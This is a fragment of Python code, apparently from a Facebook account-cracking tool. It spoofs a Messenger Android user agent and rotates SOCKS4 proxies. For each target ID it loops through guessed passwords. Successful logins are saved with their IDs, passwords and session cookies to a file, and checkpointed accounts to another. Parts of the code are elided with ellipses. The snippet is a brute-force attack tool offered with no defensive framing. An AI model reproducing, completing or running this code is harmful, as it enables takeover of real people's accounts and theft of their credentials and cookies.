...
def sex():
	...
	ua = f"[FBAN/Orca-Android;FBAV/196.0.0.29;FBPN/com.facebook.orca;FBLC/zh_CN;FBBV/474580609;FBCR/3SE;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1809;FBSV/4.5.2;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=720,height=1080};FB_FW/1;FBRV/792224820:]"
	return ua
...
def M1(ids,names,psd):
    ...
    nip=random.choice(prox)
    proxs= {'http': 'socks4://'+nip}
    sys.stdout.write(f'\r\r{A}[{G1}TAY-UGH{A}]-[{G1}{loop}{A}]-[{G1}OK{A}:{G1}{len(ok)}{A}] ')
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        ...
        for pw in psd:
            ...
            if 'access_token' in po:
                ...
                open('/sdcard/TAY-FILE-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                ok.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                #print(f'\r\r{A}[{M}TAY-CP{A}]{M} {ids} {A}|{M} {pas}')
                open('/sdcard/TAY-FILE-CP.txt','a').write(ids+'|'+pas+'\n')
            else:continue
        loop+=1
    except Exception as e:
        pass
